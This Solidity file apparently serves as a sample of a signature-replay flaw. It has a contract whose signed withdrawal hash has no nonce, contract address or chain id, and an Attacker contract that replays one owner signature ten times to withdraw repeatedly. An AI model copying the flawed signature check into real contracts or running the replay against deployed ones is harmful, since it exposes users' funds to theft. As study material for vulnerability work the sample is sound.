// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

contract IncorrectSig {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function withdrawWithSig(address to, uint256 amt, uint8 v, bytes32 r, bytes32 s) external {
        bytes32 h = keccak256(abi.encodePacked(to, amt));
        bytes32 signed = keccak256(abi.encodePacked("Signed:", h));

        require(ecrecover(signed, v, r, s) == owner, "Invalid signature");

        payable(to).transfer(amt);
    }
}

contract Attacker {
    IncorrectSig public target;

    constructor(address _target) {
        target = IncorrectSig(_target);
    }

    function attack(address to, uint256 amt, uint8 v, bytes32 r, bytes32 s) external {
        for (uint256 i = 0; i < 10; i++) {
            target.withdrawWithSig(to, amt, v, r, s);
        }
    }
}